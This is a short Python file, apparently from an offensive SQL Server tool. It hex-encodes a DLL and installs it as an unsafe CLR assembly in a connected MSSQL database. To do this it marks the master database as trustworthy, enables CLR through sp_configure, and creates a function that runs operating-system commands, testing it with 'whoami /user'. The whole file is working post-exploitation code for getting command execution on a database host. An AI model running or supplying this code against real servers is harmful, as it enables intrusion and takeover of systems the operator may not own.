#!/usr/bin/python
# -*- coding: utf-8 -*-
# import pymssql
import binascii
import config
import mssql_exec

import config


class mssql_clr:
    def __init__(self, coon, dll_ptah):
        self.coon = coon
        self.dll_path = dll_ptah

    def dll_hex(self):
        with open(self.dll_path, 'rb') as dll:
            Binary_code = dll.read()
            hexstr = binascii.b2a_hex(Binary_code).upper()
            hexdll = '0x' + hexstr.decode('utf-8')
            with open('./dll/dll.txt', 'w') as txt:
                txt.write(hexdll)
            return hexdll

    def clr_exec(self):
        clrpayload = r"""create assembly sysinfo from {} with permission_set=unsafe;""".format(self.dll_hex())
        config.mssql_exec(self.coon, payload=r"alter database master set trustworthy on;").sql_exec()
        config.mssql_exec(self.coon, payload=clrpayload).sql_exec()
        config.mssql_exec(self.coon, payload=r"exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'clr enabled',1;reconfigure;").sql_exec()
        config.mssql_exec(self.coon, payload=r"create function sysinfo_run(@proc nvarchar(max),@arg nvarchar(max)) returns nvarchar(max) as external name sysinfo.[Hi.Test.SQLClr].Run;").sql_exec()
        try:
            config.mssql_exec(self.coon, payload=r"select msdb.dbo.sysinfo_run('whoami','/user');").sql_shell()
        except Exception as e:
            print("[-]mssql_clr写入失败,请尝试其他模式！")

